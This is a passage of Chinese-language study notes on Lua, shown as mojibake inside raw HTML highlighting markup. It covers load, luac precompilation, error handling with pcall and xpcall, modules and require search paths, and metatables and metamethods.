class="hljs-built_in">lines</span>(filename, <span class="hljs-number">1024</span>))<br></code></pre></td></tr></table></figure><p>Lua å°†æ‰€æœ‰ç‹¬ç«‹çš„ä»£ç æ®µå½“ä½œåŒ¿åå¯ç¼–ç¨‹å‚æ•°çš„å‡½æ•°ä½“, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">load</span>(<span class="hljs-string">&quot;a=1&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äº:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(...)</span></span> a - <span class="hljs-number">1</span> <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>load</code> å’Œ <code>loadfile</code> ä»æ¥ä¸å¼•å‘é”™è¯¯, å½“æœ‰é”™è¯¯å‘ç”Ÿæ—¶, å®ƒä»¬ä¼šè¿”å› <code>nil</code> åŠé”™è¯¯ä¿¡æ¯. å®ƒä»¬åªæ˜¯å°†ç¨‹åºæ®µç¼–è¯‘ä¸ºä¸€ç§ä¸­é—´å½¢å¼, ç„¶åå°†ç»“æœä½œä¸ºåŒ¿åå‡½æ•°è¿”å›.</p><p><mark>å®é™…ä¸Š Lua ä¸­å‡½æ•°å®šä¹‰</mark> æ˜¯åœ¨è¿è¡Œæ—¶è€Œä¸æ˜¯åœ¨ç¼–è¯‘æ—¶å‘ç”Ÿçš„ä¸€ç§èµ‹å€¼æ“ä½œ.</p><h2 id="16-2-é¢„ç¼–è¯‘çš„ä»£ç "><a href="#16-2-é¢„ç¼–è¯‘çš„ä»£ç " class="headerlink" title="16.2 é¢„ç¼–è¯‘çš„ä»£ç "></a>16.2 é¢„ç¼–è¯‘çš„ä»£ç </h2><p>ç”Ÿæˆé¢„ç¼–è¯‘æ–‡ä»¶ (å³äºŒè¿›åˆ¶æ–‡ä»¶):</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ luac -o prog.lc prog.lua<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua prog.lc<br></code></pre></td></tr></table></figure><p>å‡ ä¹åœ¨ Lua ä¸­æ‰€æœ‰èƒ½å¤Ÿä½¿ç”¨æºç çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨é¢„ç¼–è¯‘ä»£ç .</p><p><code>luac</code> çš„ <code>-l</code> é€‰é¡¹ä¼šåˆ—å‡ºç¼–è¯‘å™¨ä¸ºæŒ‡å®šä»£ç æ®µç”Ÿæˆçš„æ“ä½œç .</p><p>é¢„ç¼–è¯‘å½¢å¼çš„ä»£ç  <mark>ä¸ä¸€å®šæ¯”æºä»£ç æ›´å°</mark> , ä½†æ˜¯å´åŠ è½½å¾—å¿«.</p><p>é¢„ç¼–è¯‘å½¢å¼çš„ä»£ç çš„å¦ä¸€ä¸ªå¥½å¤„: é¿å…ç”±äºæ„å¤–è€Œä¿®æ”¹æºç .</p><h2 id="16-3-é”™è¯¯"><a href="#16-3-é”™è¯¯" class="headerlink" title="16.3 é”™è¯¯"></a>16.3 é”™è¯¯</h2><p>æ˜¾å¼è°ƒç”¨ <code>error</code> å‡½æ•°å¹¶ä¼ å…¥ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ä½œä¸ºå‚æ•°æ¥å¼•å‘ä¸€ä¸ªé”™è¯¯:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;enter a number:&quot;</span><br>n = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;n&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> n <span class="hljs-keyword">then</span> <span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;invalid input&quot;</span>) <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ç”¨ <code>assert</code> å‡½æ•°å®Œæˆ, å…¶æ£€æŸ¥ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦ä¸ºçœŸ, å¦‚æœä¸ºçœŸåˆ™è¿”å›è¯¥å‚æ•°, å¦‚æœä¸ºå‡åˆ™å¼•å‘ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®çš„é”™è¯¯ä¿¡æ¯:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;enter a number:&quot;</span><br>n = <span class="hljs-built_in">assert</span>(<span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*n&quot;</span>), <span class="hljs-string">&quot;invalid input&quot;</span>)<br></code></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªå‡½æ•°å‘ç°æŸç§æ„å¤–çš„æƒ…å†µ, åœ¨è¿›è¡Œå¼‚å¸¸å¤„ç† (exception handling) æ—¶å¯ä»¥é‡‡å–ä¸¤ç§åŸºæœ¬æ–¹æ³•:</p><ul><li>è¿”å›é”™è¯¯ä»£ç , å¦‚ <code>nil</code> æˆ– <code>false</code></li><li>è°ƒç”¨ <code>error</code> å¼•å‘é”™è¯¯</li></ul><p><mark>åŸåˆ™</mark>: å®¹æ˜“é¿å…çš„å¼‚å¸¸åº”è¯¥å¼•å‘é”™è¯¯, å¦åˆ™åº”è¯¥è¿”å›é”™è¯¯ç .</p><h2 id="16-4-é”™è¯¯å¤„ç†å’Œå¼‚å¸¸"><a href="#16-4-é”™è¯¯å¤„ç†å’Œå¼‚å¸¸" class="headerlink" title="16.4 é”™è¯¯å¤„ç†å’Œå¼‚å¸¸"></a>16.4 é”™è¯¯å¤„ç†å’Œå¼‚å¸¸</h2><p>å¤„ç†é”™è¯¯, ä½¿ç”¨ <code>pcall</code> å‡½æ•° (protected call) æ¥å°è£…ä»£ç .</p><p>æ‰§è¡Œä¸€æ®µ Lua ä»£ç å¹¶æ•è· (try-catch) æ‰§è¡Œä¸­å‘ç”Ÿçš„æ‰€æœ‰é”™è¯¯, é¦–å…ˆå°†è¿™æ®µä»£ç å°è£…åˆ°ä¸€ä¸ªå‡½æ•°ä¸­, è¿™ä¸ªå‡½æ•°é€šå¸¸æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°, ä¹‹åé€šè¿‡ <code>pcall</code> æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> ok, meg = <span class="hljs-built_in">pcall</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span></span><br><br>    ...<br><br>    <span class="hljs-keyword">if</span> unexpected_condition <span class="hljs-keyword">then</span> <span class="hljs-built_in">error</span>() <span class="hljs-keyword">end</span><br>    some code <br>    <span class="hljs-built_in">print</span>(a[i])<br><br>    ...<br><br>    <span class="hljs-keyword">end</span>)<br><br><span class="hljs-keyword">if</span> ok <span class="hljs-keyword">then</span> <br>    regular code<br><span class="hljs-keyword">else</span> <br>    <span class="hljs-built_in">error</span>-handing code<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>pcall</code> ä¼šä»¥ä¸€ç§ä¿æŠ¤æ¨¡å¼ (protected mode) æ¥è°ƒç”¨å®ƒçš„ç¬¬1ä¸ªå‚æ•°, ä»¥ä¾¿æ•è·è¯¥å‡½æ•°æ‰§è¡Œä¸­çš„é”™è¯¯. æ— è®ºé”™è¯¯æ˜¯å¦æœ‰é”™è¯¯å‘ç”Ÿ, <code>pcall</code> éƒ½ä¸ä¼šå¼•å‘é”™è¯¯. <code>pcall</code> æœ‰ <mark>ä¸¤ä¸ªè¿”å›å€¼</mark>:</p><ul><li>æ²¡æœ‰é”™è¯¯, è¿”å› <code>true</code> ä»¥åŠè¢«è°ƒç”¨å‡½æ•°çš„æ‰€æœ‰è¿”å›å€¼</li><li>é”™è¯¯, è¿”å› <code>false</code> åŠé”™è¯¯ä¿¡æ¯</li></ul><h2 id="16-5-é”™è¯¯ä¿¡æ¯å’Œæ ˆå›æº¯"><a href="#16-5-é”™è¯¯ä¿¡æ¯å’Œæ ˆå›æº¯" class="headerlink" title="16.5 é”™è¯¯ä¿¡æ¯å’Œæ ˆå›æº¯"></a>16.5 é”™è¯¯ä¿¡æ¯å’Œæ ˆå›æº¯</h2><p><code>error</code> è¿˜æœ‰ç¬¬ 2 ä¸ªå¯é€‰å‚æ•° <code>level</code>.</p><p>å½“ <code>pcall</code> è¿”å›é”™è¯¯ä¿¡æ¯æ—¶, éƒ¨åˆ†çš„è°ƒç”¨æ ˆå·²ç»è¢«ç ´åäº† (ä» <code>pcall</code> åˆ°å‡ºé”™ä¹‹å¤„çš„éƒ¨åˆ†), å¦‚æœå¸Œæœ›å¾—åˆ°ä¸€ä¸ªæœ‰æ„ä¹‰çš„æ ˆå›æº¯, é‚£ä¹ˆå°±å¿…é¡»åœ¨å‡½æ•° <code>pcall</code> è¿”å›å‰å…ˆå°†è°ƒç”¨æ ˆæ„é€ å¥½, å³ä½¿ç”¨ <code>xpcall</code> å‡½æ•°.</p><p><code>xpcall</code> å’Œ <code>pcall</code> ç±»ä¼¼, ä½†å…¶ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ¶ˆæ¯å¤„ç†å‡½æ•° (message handler function)</p><p>å½“é”™è¯¯å‘ç”Ÿæ—¶, Lua ä¼šåœ¨è°ƒç”¨æ ˆå±•å¼€ (stack unwind) å‰è°ƒç”¨è¿™ä¸ªæ¶ˆæ¯å¤„ç†å‡½æ•°, ä»¥ä¾¿æ¶ˆæ¯å¤„ç†å‡½æ•°èƒ½å¤Ÿä½¿ç”¨è°ƒè¯•åº“æ¥è·å–æœ‰å…³é”™è¯¯çš„æ›´å¤šä¿¡æ¯.</p><p>ä¸¤ä¸ªå¸¸ç”¨çš„æ¶ˆæ¯å¤„ç†å‡½æ•°:</p><ul><li><code>debug.debug</code>, æä¾›ä¸€ä¸ª Lua æç¤ºç¬¦è®©ç”¨æˆ·æ¥æ£€æŸ¥é”™è¯¯å‘ç”ŸåŸå› </li><li><code>debug.traceback</code>, ä½¿ç”¨è°ƒç”¨æ ˆæ¥æ„é€ è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯</li></ul><h1 id="17-æ¨¡å—å’ŒåŒ…"><a href="#17-æ¨¡å—å’ŒåŒ…" class="headerlink" title="17 æ¨¡å—å’ŒåŒ…"></a>17 æ¨¡å—å’ŒåŒ…</h1><p><mark>ä»ç”¨æˆ·è§‚ç‚¹æ¥çœ‹</mark>, ä¸€ä¸ªæ¨¡å— (module) å°±æ˜¯ä¸€äº›ä»£ç  (è¦ä¹ˆæ˜¯ Lua, è¦ä¹ˆæ˜¯ C), è¿™äº›ä»£ç å¯ä»¥é€šè¿‡å‡½æ•° <code>require</code> åŠ è½½, ç„¶ååˆ›å»ºå’Œè¿”å›ä¸€ä¸ªè¡¨, è¿™ä¸ªè¡¨å°±åƒæ˜¯æŸç§å‘½åç©ºé—´, å…¶ä¸­å®šä¹‰çš„å†…å®¹æ˜¯æ¨¡å—ä¸­å¯¼å‡ºçš„ä¸œè¥¿, æ¯”å¦‚å‡½æ•°å’Œå¸¸é‡.</p><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> m = <span class="hljs-built_in">require</span> <span class="hljs-string">&quot;math&quot;</span><br><span class="hljs-built_in">print</span>(m.<span class="hljs-built_in">sin</span>(<span class="hljs-number">3.14</span>))<br></code></pre></td></tr></table></figure><p>ç‹¬ç«‹è§£é‡Šå™¨ä¼šä½¿ç”¨è·Ÿå¦‚ä¸‹ä»£ç ç­‰ä»·çš„æ–¹å¼ <mark>æå‰åŠ è½½æ‰€æœ‰æ ‡å‡†åº“</mark> </p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">math</span> = <span class="hljs-built_in">require</span> <span class="hljs-string">&quot;math&quot;</span><br><span class="hljs-built_in">string</span> = <span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span><br>...<br></code></pre></td></tr></table></figure><h2 id="17-1-å‡½æ•°-require"><a href="#17-1-å‡½æ•°-require" class="headerlink" title="17.1 å‡½æ•° require"></a>17.1 å‡½æ•° <code>require</code></h2><p>é¦–å…ˆ, <code>require</code> å‡½æ•°åœ¨è¡¨ <code>package.loaded</code> ä¸­æ£€æŸ¥æ¨¡å—æ˜¯å¦å·²è¢«åŠ è½½:</p><ul><li>å¦‚æœæ¨¡å—å·²ç»è¢«åŠ è½½, å‡½æ•° <code>require</code> å°±è¿”å›ç›¸åº”çš„å€¼ã€‚</li><li>å¦‚æœæ¨¡å—æœªè¢«åŠ è½½, å‡½æ•° <code>require</code> åˆ™æœç´¢å…·æœ‰æŒ‡å®šæ¨¡å—åçš„ Lua æ–‡ä»¶, æœç´¢è·¯å¾„ç”±å˜é‡ <code>package.path</code> æŒ‡å®š. <ul><li>æ‰¾åˆ°äº†, å°±ç”¨ <code>loadfile</code> åŠ è½½, è¿”å›ä¸€ä¸ªç§°ä¸º<mark>åŠ è½½å™¨</mark>çš„å‡½æ•°</li><li>æ²¡æ‰¾åˆ°, æœç´¢ç›¸åº”åç§°çš„ C æ ‡å‡†åº“, (è·¯å¾„ç”± <code>package.cpath</code> æŒ‡å®š) æ‰¾åˆ°åˆ™ä½¿ç”¨åº•å±‚å‡½æ•° <code>package.loadlib</code> è¿›è¡ŒåŠ è½½, è¿™ä¸ªåº•å±‚å‡½æ•°ä¼šæŸ¥æ‰¾åä¸º <code>luaopen_modname</code> çš„å‡½æ•°å¹¶è¿”å›</li></ul></li></ul><p><mark>ä¸ºäº†æœ€ç»ˆåŠ è½½æ¨¡å—</mark> , <code>require</code> å‡½æ•°å¸¦ç€ä¸¤ä¸ªå‚æ•°è°ƒç”¨åŠ è½½å‡½æ•° (å¤§å¤šæ•°æ¨¡å—ä¼šå¿½ç•¥):</p><ul><li>æ¨¡å—å</li><li>åŠ è½½å‡½æ•°æ‰€åœ¨æ–‡ä»¶çš„åç§°</li></ul><p>å¦‚æœåŠ è½½å‡½æ•°æœ‰è¿”å›å€¼, é‚£ä¹ˆå‡½æ•° <code>require</code> ä¼šè¿”å›è¿™ä¸ªå€¼, ç„¶åä¿å­˜åœ¨è¡¨ <code>package.loaded</code> ä¸­.</p><p>å¦‚æœåŠ è½½å‡½æ•°æ²¡æœ‰è¿”å›å€¼ä¸”è¡¨ä¸­çš„ <code>package.loaded[@rep&#123;modname&#125;]</code> ä¸ºç©º, å‡½æ•° <code>require</code> å°±å‡è®¾æ¨¡å—çš„è¿”å›å€¼æ˜¯ <code>true</code>.</p><h3 id="17-1-1-æ¨¡å—é‡å‘½å"><a href="#17-1-1-æ¨¡å—é‡å‘½å" class="headerlink" title="17.1.1 æ¨¡å—é‡å‘½å"></a>17.1.1 æ¨¡å—é‡å‘½å</h3><p>å¯¹äº Lua è¯­è¨€æ¨¡å—: å†™è¯¥ <code>.lua</code> æ–‡ä»¶çš„æ–‡ä»¶åå³å¯.</p><p>å¯¹äº C æ ‡å‡†åº“çš„äºŒè¿›åˆ¶ç›®æ ‡ä»£ç ä¸­ <code>luaopen_*</code> å‡½æ•°çš„åç§°, ä½¿ç”¨ <mark>è¿å­—ç¬¦æŠ€å·§</mark> (è§ä¹¦, ä¸æ˜¯å¾ˆæ‡‚) </p><h3 id="17-1-2-æœç´¢è·¯å¾„"><a href="#17-1-2-æœç´¢è·¯å¾„" class="headerlink" title="17.1.2 æœç´¢è·¯å¾„"></a>17.1.2 æœç´¢è·¯å¾„</h3><p><code>require</code> ä½¿ç”¨çš„è·¯å¾„æ˜¯ä¸€ç»„æ¨¡æ¿, å°† <code>?</code> æ›¿æ¢ä¸ºæ–‡ä»¶åæ¥æŸ¥æ‰¾, ä¼šä¸€ä¸ªä¸€ä¸ªå°è¯•, æ¨¡æ¿ä¹‹é—´ç”¨ <code>;</code> åˆ†éš”, å¦‚ä¸€ç»„æ¨¡æ¿ä¸º:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?;?.lua;c:\windows\?;/usr/<span class="hljs-keyword">local</span>/lua/?/?.lua<br></code></pre></td></tr></table></figure><p>è¯¥å€¼å­˜å‚¨åœ¨ <code>package.path</code> å˜é‡ä¸­.</p><p>åˆ™ <code>require &quot;sql&quot;</code> ä¼šå°è¯•æ‰“å¼€:</p><ul><li><code>sql</code></li><li><code>sql.lua</code></li><li><code>c:\windows\sql</code></li><li><code>/usr/local/lua/sql/sql.lua</code></li></ul><p>å½“ <code>package</code> æ¨¡å—è¢«åˆå§‹åŒ–å, å®ƒå°±æŠŠå˜é‡ <code>package.path</code> è®¾ç½®æˆç¯å¢ƒå˜é‡ <code>LUA_PATH_5_3</code> çš„å€¼, æœªå®šä¹‰åˆ™å°è¯• <code>LUA_PATH</code>. éƒ½æœªå®šä¹‰åˆ™ä½¿ç”¨ä¸€ä¸ªç¼–è¯‘æ—¶å®šä¹‰çš„é»˜è®¤è·¯å¾„.</p><p>åœ¨ä½¿ç”¨ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼æ—¶, Lua ä¼šå°†å…¶ä¸­æ‰€æœ‰çš„ <code>;;</code> æ›¿æ¢æˆé»˜è®¤è·¯å¾„, ä¾‹: <code>LUA_PATH_5_3=&#39;mydir/?.lua;;&#39;</code>, åˆ™æœ€ç»ˆè·¯å¾„å°±ä¼šæ˜¯æ¨¡æ¿ <code>mydir/?.lua</code> åè·Ÿé»˜è®¤è·¯å¾„.</p><p>æœç´¢ C æ ‡å‡†åº“ç±»ä¼¼. å˜é‡ä¸º <code>package.cpath</code>, ç¯å¢ƒå˜é‡ä¸º <code>LUA_CPATH_5_3</code> æˆ– <code>LUA_CPATH</code></p><h3 id="17-1-3-æœç´¢å™¨"><a href="#17-1-3-æœç´¢å™¨" class="headerlink" title="17.1.3 æœç´¢å™¨"></a>17.1.3 æœç´¢å™¨</h3><h2 id="17-2-Lua-è¯­è¨€ä¸­ç¼–å†™æ¨¡å—çš„åŸºæœ¬æ–¹æ³•"><a href="#17-2-Lua-è¯­è¨€ä¸­ç¼–å†™æ¨¡å—çš„åŸºæœ¬æ–¹æ³•" class="headerlink" title="17.2 Lua è¯­è¨€ä¸­ç¼–å†™æ¨¡å—çš„åŸºæœ¬æ–¹æ³•"></a>17.2 Lua è¯­è¨€ä¸­ç¼–å†™æ¨¡å—çš„åŸºæœ¬æ–¹æ³•</h2><p><mark>åˆ›å»ºæ¨¡å—çš„æœ€ç®€å•æ–¹æ³•æ˜¯</mark> åˆ›å»ºä¸€ä¸ªè¡¨å¹¶å°†æ‰€æœ‰éœ€è¦å¯¼å‡ºçš„å‡½æ•°æ”¾å…¥å…¶ä¸­, æœ€åè¿”å›è¿™ä¸ªè¡¨. å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> M = &#123;&#125;    <span class="hljs-comment">-- æ¨¡å—</span><br><br><span class="hljs-comment">-- åˆ›å»ºä¸€ä¸ªæ–°çš„å¤æ•°</span><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">new</span><span class="hljs-params">(r, i)</span></span><br>    <span class="hljs-keyword">return</span> &#123;r=r, i=i&#125;<br><span class="hljs-keyword">end</span><br><br>M.new = new     <span class="hljs-comment">-- æŠŠ &#x27;new&#x27; åŠ åˆ°æ¨¡å—ä¸­</span><br><br><span class="hljs-comment">-- constant &#x27;i&#x27;</span><br>M.i = new(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.add</span><span class="hljs-params">(c1, c2)</span></span><br>    <span class="hljs-keyword">return</span> new(c1.r + c2.r, c1.i + c2.i)<br><span class="hljs-keyword">end</span><br><br>...<br><br><span class="hljs-keyword">return</span> M<br></code></pre></td></tr></table></figure><p>ä¸ä½¿ç”¨ <code>return M</code> çš„æ–¹å¼:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> M = &#123;&#125;<br><span class="hljs-built_in">package</span>.<span class="hljs-built_in">loaded</span>[...] = M<br></code></pre></td></tr></table></figure><p><code>require</code> ä¼šæŠŠæ¨¡å—çš„åç§°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ ç»™åŠ è½½å‡½æ•°, å› æ­¤è¿™é‡Œçš„ <code>...</code> ä¸ºæ¨¡å—å.</p><p>å¦‚æœä¸€ä¸ªæ¨¡å—æ²¡æœ‰è¿”å›å€¼, é‚£ä¹ˆ <code>require</code> ä¼šè¿”å› <code>package.loaded[modname]</code> çš„å½“å‰å€¼.</p><p><mark>å¦ä¸€ç§ç¼–å†™æ¨¡å—çš„æ–¹æ³•</mark> : æŠŠæ‰€æœ‰çš„å‡½æ•°å®šä¹‰ä¸ºå±€éƒ¨å˜é‡, ç„¶åå†æœ€åè¿”å›è¡¨:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span><span class="hljs-params">(c1, c2)</span></span><br>    <span class="hljs-keyword">return</span> new(c1.r + c2.r, c1.i + c2.i)<br><span class="hljs-keyword">end</span><br><br>...<br><br><span class="hljs-keyword">return</span> &#123;<br>    new = new,<br>    add = add,<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="17-3-å­æ¨¡å—å’ŒåŒ…"><a href="#17-3-å­æ¨¡å—å’ŒåŒ…" class="headerlink" title="17.3 å­æ¨¡å—å’ŒåŒ…"></a>17.3 å­æ¨¡å—å’ŒåŒ…</h2><p>Lua æ”¯æŒå…·æœ‰å±‚æ¬¡ç»“æ„çš„æ¨¡å—å, <mark>é€šè¿‡ç‚¹</mark>æ¥åˆ†éš”åç§°ä¸­çš„å±‚æ¬¡.</p><p>å½“æœç´¢ä¸€ä¸ªå®šä¹‰å­æ¨¡å—çš„æ–‡ä»¶æ—¶, <code>require</code> ä¼šå°†ç‚¹è½¬æ¢ä¸ºå¦ä¸€ä¸ªå­—ç¬¦, é€šå¸¸å°±æ˜¯æ“ä½œç³»ç»Ÿçš„ç›®å½•åˆ†éš”ç¬¦.</p><h1 id="20-å…ƒè¡¨å’Œå…ƒæ–¹æ³•"><a href="#20-å…ƒè¡¨å’Œå…ƒæ–¹æ³•" class="headerlink" title="20 å…ƒè¡¨å’Œå…ƒæ–¹æ³•"></a>20 å…ƒè¡¨å’Œå…ƒæ–¹æ³•</h1><p><mark>å…ƒè¡¨</mark> æ˜¯ä¸€ä¸ªè¡¨, å…¶å†…å®¹æ˜¯ <mark>å…ƒæ–¹æ³• (metamethod)</mark>å¦‚ <code>__add</code>, <code>__sub</code>, å¼„æˆè¡¨åº”è¯¥æ˜¯æ–¹ä¾¿æŸ¥è¯¢. å¯ä»¥ä¿®æ”¹ä¸€ä¸ªå€¼æŸä¸ªæ“ä½œ (åŠ æ³•å‡æ³•ä¹‹ç±») çš„è¡Œä¸º, å¦‚: <code>a</code> å’Œ <code>b</code> éƒ½æ˜¯è¡¨, å¯ä»¥é€šè¿‡å…ƒè¡¨å®šä¹‰å¦‚ä½•è®¡ç®— <code>a + b</code></p><p>å½“ Lua è¯­è¨€è¯•å›¾å°†ä¸¤ä¸ªè¡¨ç›¸åŠ , å®ƒä¼šå…ˆæ£€æŸ¥ä¸¤è€…ä¹‹ä¸€<mark>æ˜¯å¦æœ‰å…ƒè¡¨ (metatable)</mark> ä¸”è¯¥å…ƒè¡¨ä¸­æ˜¯å¦æœ‰ <code>__add</code> å­—æ®µ (ä¸¤ä¸ªä¸‹åˆ’çº¿). å¦‚æœ Lua æ‰¾åˆ°äº†è¯¥å­—æ®µ, å°±è°ƒç”¨è¯¥å­—æ®µå¯¹åº”çš„å€¼, å³ <mark>å…ƒæ–¹æ³• (metamethod)</mark> (ä¸€ä¸ªå‡½æ•°).</p><p>å…ƒè¡¨åªèƒ½ç»™å‡ºé¢„å…ˆå®šä¹‰çš„æ“ä½œé›†åˆçš„è¡Œä¸º, å…¶ä¸æ”¯æŒç»§æ‰¿.</p><p>Lua ä¸­çš„æ¯ä¸€ä¸ªå€¼éƒ½å¯ä»¥æœ‰å…ƒè¡¨.</p><p>ç”¨ <code>getmetatable</code> æ¥è·å–å…ƒè¡¨.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">t = &#123;&#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">getmetatable</span>(t))  <span class="hljs-comment">--&gt; nil</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨å‡½æ•° <code>setmetatable</code> æ¥è®¾ç½®æˆ–ä¿®æ”¹ä»»æ„è¡¨çš„å…ƒè¡¨:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">t1 = &#123;&#125;<br><span class="hljs-built_in">setmetatable</span>(t, t1)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">getmetatable</span>(t) == t1)    <span class="hljs-comment">--&gt; true</span><br></code></pre></td></tr></table></figure><p>Lua ä¸­åªèƒ½ä¸ºè¡¨è®¾ç½®å…ƒè¡¨. å¦‚æœè¦ä¸ºå…¶ä»–ç±»å‹çš„å€¼è®¾ç½®å…ƒè¡¨, å¿…é¡»é€šè¿‡ C ä»£ç æˆ–è°ƒè¯•åº“å®Œæˆ.</p><p>ä¸€ä¸ªè¡¨å¯ä»¥æˆä¸ºä»»æ„å€¼çš„å…ƒè¡¨.</p><h2 id="20-1-ç®—æœ¯è¿ç®—ç›¸å…³çš„å…ƒæ–¹æ³•"><a href="#20-1-ç®—æœ¯è¿ç®—ç›¸å…³çš„å…ƒæ–¹æ³•" class="headerlink" title="20.1 ç®—æœ¯è¿ç®—ç›¸å…³çš„å…ƒæ–¹æ³•"></a>20.1 ç®—æœ¯è¿ç®—ç›¸å…³çš„å…ƒæ–¹æ³•</h2><p>ç¤ºä¾‹:</p><p><code>set</code> æ˜¯ä¸€ä¸ªç±»å‹çš„è¡¨ </p><p><code>local mt = &#123;&#125;</code> æ˜¯ä¸€ä¸ªå…ƒè¡¨</p><p><code>setmetatable(set, mt)</code> è®¾ç½® <code>set</code> çš„å…ƒè¡¨ä¸º <code>mt</code>.</p><p><code>Set.union</code> å®šä¹‰äº† <code>set</code> è¿™ç§ç±»å‹è¡¨çš„ç›¸åŠ æ“ä½œ</p><p><code>mt.__add = Set.union</code> è®¾ç½®å…ƒè¡¨çš„å…ƒæ–¹æ³•.</p><p>ä¹‹å <code>set</code> ç›¸åŠ æ—¶å¦‚ <code>set1 + set2</code> å°±ä¼šè‡ªåŠ¨è°ƒç”¨ <code>mt.__add</code> å³ <code>Set.union</code> å‡½æ•°</p><p>æ¯ç§ç®—æœ¯è¿ç®—ç¬¦éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„å…ƒæ–¹æ³•, ä½æ“ä½œä¹Ÿæœ‰å…ƒæ–¹æ³•:</p><ul><li><code>__sub</code></li><li><code>__div</code></li><li><code>__idiv</code></li><li><code>__unm</code></li><li><code>__mod</code></li><li><code>__pow</code></li><li><code>__band</code></li><li><code>__bor</code></li><li><code>__bxor</code></li><li><code>__bnot</code></li><li><code>__shl</code></li><li><code>__shr</code></li><li><code>__concat</code><br>ç­‰.</li></ul><p><mark>Lua æŸ¥æ‰¾å…ƒæ–¹æ³•çš„æ­¥éª¤</mark> 